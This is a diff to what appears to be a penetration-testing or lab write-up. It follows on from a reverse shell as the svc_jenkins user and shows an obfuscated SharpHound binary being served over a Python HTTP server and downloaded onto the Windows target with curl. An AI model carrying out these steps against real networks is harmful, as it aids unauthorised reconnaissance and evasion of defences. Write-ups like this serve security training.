@@ -555,3 +555,29 @@ C:\Program Files\Jenkins>
 ```
 i now have a reverse shell as the svc_jenkins user
 
+# Uploading sharphound
+
+So after looking around for a while, im going to try upload sharphound to see if it give me any extra information
+
+```python
+python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+Ill start a web 
+
+```python
+curl http://10.200.52.144:8000/SharpHound.exe._obf.exe -o sharphound-obf.exe
+PS C:\temp> dir
+dir
+
+
+    Directory: C:\temp
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----         5/1/2026  12:46 PM         734720 sharphound-obf.exe                                                    
+
+
+PS C:\temp> 
+```
